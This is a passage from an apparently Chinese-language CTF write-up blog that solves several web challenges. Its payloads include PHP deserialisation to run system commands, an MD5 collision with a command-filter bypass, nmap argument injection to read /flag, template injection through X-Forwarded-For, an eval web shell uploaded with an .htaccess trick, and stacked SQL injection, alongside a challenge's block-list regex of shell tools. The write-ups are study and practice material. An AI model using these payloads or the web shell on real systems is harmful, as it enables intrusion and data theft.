timezone settings. You are <em>required</em> to use the date.timezone setting or the date_default_timezone_set() function. In case you used any of those methods and you are still getting this warning, you most likely misspelled the timezone identifier. We selected the timezone ‘UTC’ for now, but please set date.timezone to select your timezone. in /var/www/html/index.php on line 24<br>2021-11-05 06:48:31 am</p></blockquote><p>查看源代码，关键代码如下</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script language<span class="token operator">=</span>javascript<span class="token operator">></span>    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token string">"document.form1.submit()"</span><span class="token punctuation">,</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>hidden</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>func</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>func</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>date<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>hidden</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>p</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>p</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>Y-m-d h:i:s a<span class="token punctuation">'</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>根据页面显示，这两个提交的数据应该是可以利用的。<br>先禁用js，再手动提交参数测试。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?func=a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回显</p><blockquote><p>Warning: call_user_func() expects parameter 1 to be a valid callback, function ‘a’ not found or invalid function name in /var/www/html/index.php on line 24</p></blockquote><p>那么<code>call_user_func</code>的参数应该分别是我们提交的<code>func</code>和<code>p</code><br><del>理论上讲已经可以直接拿到flag了</del> </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?func=file_get_contents&amp;p=index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$disable_fun</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"shell_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"system"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"passthru"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_open"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"show_source"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"popen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"dl"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"eval"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"proc_terminate"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"touch"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellcmd"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"escapeshellarg"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"assert"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"substr_replace"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func_array"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"call_user_func"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_filter"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span>  <span class="token string double-quoted-string">"array_map"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"registregister_shutdown_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"register_tick_function"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"filter_var"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"filter_var_array"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uasort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"uksort"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_reduce"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"array_walk"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"array_walk_recursive"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"pcntl_exec"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fopen"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"fwrite"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"file_put_contents"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"string"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$result</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> <span class="token variable">$p</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s a"</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span> <span class="token operator">!=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">func</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$p</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"p"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$func</span> <span class="token operator">!=</span> <span class="token constant">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$func</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$disable_fun</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">gettime</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span> <span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Hacker..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>正常传递函数和参数恐怕是难以绕过，但源码里有一个类，那么方法已经很显然了，传递一个反序列化函数和一个序列化字符串，利用魔术方法获取flag</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?func=unserialize&amp;p=O:4:"Test":2:&#123;s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var var</p></blockquote><p>出人意料的是，flag不在根目录下,查找flag文件也找不到，可能改了名字</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?func=unserialize&amp;p=O:4:"Test":2:&#123;s:1:"p";s:21:"find / -name '*flag*'";s:4:"func";s:6:"system";&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到大量数据，当然不能一个一个去看，找找看起来不正常的<br><img src="https://img-blog.csdnimg.cn/a26382f1ae7c4362977d289f5b06b781.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>最终找到一个</p><blockquote><p>/tmp/flagoefiu4r93</p></blockquote><p>拿到flag</p><h1 id="lt-安洵杯-2019-gt-easy-web"><a href="#lt-安洵杯-2019-gt-easy-web" class="headerlink" title="&lt;安洵杯 2019&gt;easy_web"></a>&lt;安洵杯 2019&gt;easy_web</h1><p>打开题目，网址为</p><blockquote><p>index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</p></blockquote><p>这两个参数似乎可以利用<br>对<code>img</code>参数进行测试，发现加载的图片好像是由<code>img</code>决定的</p><p>对<code>TXpVek5UTTFNbVUzTURabE5qYz0</code>base64解码<br>得到<code>MzUzNTM1MmU3MDZlNjc=</code>，再次解码<br>得到<code>3535352e706e67</code>，再hex解码<br>得到<code>555.png</code></p><p>那可以直接得到<code>index.php</code>的源码  ，<del>那岂不是也可以直接拿到flag</del> </p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?img=TmprMlJUWTBOalUzT0RKRk56QTJPRGN3&amp;cmd=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token class-name">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>     <span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='data:image/gif;base64,"</span> <span class="token operator">.</span> <span class="token variable">$txt</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'>&lt;/img>"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">body</span><span class="token punctuation">&#123;</span>   <span class="token property">background</span><span class="token punctuation">:</span><span class="token url"><span class="token function">url</span><span class="token punctuation">(</span>./bj.png<span class="token punctuation">)</span></span>  no-repeat center center<span class="token punctuation">;</span>   <span class="token property">background-size</span><span class="token punctuation">:</span>cover<span class="token punctuation">;</span>   <span class="token property">background-attachment</span><span class="token punctuation">:</span>fixed<span class="token punctuation">;</span>   <span class="token property">background-color</span><span class="token punctuation">:</span>#CCCCCC<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意这段代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`$cmd`</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>PHP中，利用反引号可以执行 Unix 下的命令，并传回执行结果</p><p>那么接下来就是<code>cmd</code>的利用了<br>绕过<code>preg_match()</code>以及post传参绕过MD5强验证</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">index.php?img=0&amp;cmd=ca\t%20/flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>md5强碰撞</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="lt-BUUCTF-2018-gt-Online-Tool"><a href="#lt-BUUCTF-2018-gt-Online-Tool" class="headerlink" title="&lt;BUUCTF 2018&gt;Online Tool"></a>&lt;BUUCTF 2018&gt;Online Tool</h1><p>打开题目，得到代码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$host</span> <span class="token operator">=</span> <span class="token function">escapeshellcmd</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glzjin"</span><span class="token operator">.</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'you are in sandbox '</span><span class="token operator">.</span><span class="token variable">$sandbox</span><span class="token punctuation">;</span>    @<span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span><span class="token operator">.</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>很显然，绕过 <code>escapeshellarg()</code> 和 <code>escapeshellcmd()</code> ,进行注入<br>这是个已知的漏洞    <a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><p>构造payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>host<span class="token operator">=</span><span class="token string single-quoted-string">' -iL /flag oN 1.txt '</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="lt-GWCTF-2019-gt-我有一个数据库"><a href="#lt-GWCTF-2019-gt-我有一个数据库" class="headerlink" title="&lt;GWCTF 2019&gt;我有一个数据库"></a>&lt;GWCTF 2019&gt;我有一个数据库</h1><p>打开题目</p><blockquote><p>鎴戞湁涓€涓暟鎹簱锛屼絾閲岄潰浠€涔堜篃娌℃湁~<br>涓嶄俊浣犳壘</p></blockquote><p>直接查看<br><img src="https://img-blog.csdnimg.cn/b80641b226544826849804676249e57b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>没什么提示，那就先扫一遍目录<br>有 robots.txt 和 phpmyadmin</p><p>robots.txt</p><blockquote><p>User-agent: *<br>Disallow: phpinfo.php</p></blockquote><p>访问，得到 phpinfo() 界面</p><p>phpmyadmin 直接进入后台管理，但没有得到任何数据，看看这个版本的phpmyadmin有什么可以利用的漏洞<br><img src="https://img-blog.csdnimg.cn/de57100a125247fdb9e22a688884b0be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAZDB1ZA==,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>搜索出来一大堆，直接借着现成的payload就行了</p><h1 id="lt-BJDCTF2020-gt-The-mystery-of-ip"><a href="#lt-BJDCTF2020-gt-The-mystery-of-ip" class="headerlink" title="&lt;BJDCTF2020&gt;The mystery of ip"></a>&lt;BJDCTF2020&gt;The mystery of ip</h1><p>打开题目，不知所云</p><p>在flag.php界面回显ip地址，尝试修改XFF头，回显得到输入的数据<br>尝试注入，发现模板注入成功</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">X-Forwarded-For: &#123;&#123;system("ls /")&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">X-Forwarded-For: &#123;&#123;system("cat /flag")&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="lt-GXYCTF2019-gt-BabyUpload"><a href="#lt-GXYCTF2019-gt-BabyUpload" class="headerlink" title="&lt;GXYCTF2019&gt;BabyUpload"></a>&lt;GXYCTF2019&gt;BabyUpload</h1><p>简单的文件上传<br>测试发现不能上传后缀中带有ph的文件<br>但可以上传.htaccess和.jpg并且会给出文件路径</p><p>a.jpg</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">GIF8a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string single-quoted-string">'php'</span><span class="token operator">></span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'door'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>.htaccess</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">AddType application/x-httpd-php .jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>蚁剑连接得到flag</p><h1 id="lt-SUCTF-2019-gt-EasySQL"><a href="#lt-SUCTF-2019-gt-EasySQL" class="headerlink" title="&lt;SUCTF 2019&gt;EasySQL"></a>&lt;SUCTF 2019&gt;EasySQL</h1><p>打开题目，简单测试，可以发现是数字型注入</p><p>对于提交的数据，字符不回显，除零回显不同外，任何数字都有相同回显，union被过滤，但在尝试堆叠注入时成功。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">query=1;show tables;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )</p></blockquote><p>在后续测试中发现，如果在提交的数字后加入分号，则回显的数据为提交的数字，猜测查询语句的前半段为</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">select $_POST['query'] ...<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">query=13;select 4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Array ( [0] =&gt; 13 ) Array ( [0] =&gt; 1 )</p></blockquote><p>猜测正确，那这不是白给吗，</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">query=*,1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到flag</p><h1 id="lt-MRCTF2020-gt-你传你——呢"><a 